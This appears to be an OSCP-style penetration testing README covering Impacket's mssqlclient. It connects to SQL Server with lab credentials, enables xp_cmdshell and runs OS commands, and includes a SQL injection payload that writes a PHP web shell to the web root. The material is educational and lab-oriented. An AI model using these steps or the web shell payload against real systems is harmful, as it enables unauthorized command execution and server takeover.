
#  Penetration Testing with Impacket MSSQLClient "OSCP guide"

This repository provides a comprehensive guide on how to perform advanced penetration testing using the Impacket `mssqlclient` tool. This guide covers the setup, configuration, and advanced usage scenarios for effective penetration testing.

## Table of Contents

1. [Introduction](#introduction)
2. [Installation](#installation)
3. [Connecting to a SQL Server](#connecting-to-a-sql-server)
4. [Enabling Advanced Options](#enabling-advanced-options)
5. [Executing Commands](#executing-commands)
6. [Advanced Usage](#advanced-usage)
7. [MySQL Database Penetration](#mysql-database-penetration)
8. [Security Considerations](#security-considerations)
9. [Resources](#resources)
10. [Contributing](#contributing)
11. [License](#license)

## Introduction

Impacket is a collection of Python classes for working with network protocols. `mssqlclient` is a tool within the Impacket suite designed to interact with Microsoft SQL Server. This guide provides advanced techniques for leveraging `mssqlclient` in penetration testing scenarios.

## Installation

To install Impacket, ensure Python and pip are installed, then follow these steps:

```bash
git clone https://github.com/fortra/impacket.git
cd impacket
pip install .
```

## Connecting to a SQL Server

Use `mssqlclient` to connect to a SQL Server instance from your Kali VM:

```bash
impacket-mssqlclient Administrator:Lab123@192.168.212.18 -windows-auth
```

```plaintext
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (SQLPLAYGROUND\Administrator  dbo@master)> EXECUTE xp_cmdshell 'whoami';
output

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

nt service\mssql$sqlexpress

NULL
```

## Enabling Advanced Options

To execute Windows shell commands via `xp_cmdshell`, follow these steps after connecting:

1. **Enable advanced options**:
    ```sql
    EXEC sp_configure 'show advanced options', 1;
    RECONFIGURE;
    ```

2. **Enable xp_cmdshell**:
    ```sql
    EXEC sp_configure 'xp_cmdshell', 1;
    RECONFIGURE;
    ```

## Executing Commands

Once `xp_cmdshell` is enabled, execute system commands directly from the SQL Server:

- **Check the current user**:
    ```sql
    EXEC xp_cmdshell 'whoami';
    ```

## Advanced Usage

With full system control, escalate SQL shell to a reverse shell for expanded capabilities.

### MySQL Database Penetration

While MySQL lacks a direct RCE function, leverage the `SELECT INTO OUTFILE` statement to write files on the web server.

```sql
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

## Security Considerations

Exercise caution when using `mssqlclient` or similar tools:

- Obtain proper authorization for penetration testing.
- Understand potential impact on systems.
- Adhere to responsible disclosure practices for vulnerabilities.

## Resources

- [Impacket GitHub Repository](https://github.com/fortra/impacket)
- [SQL Server Documentation](https://docs.microsoft.com/en-us/sql/sql-server/)


```
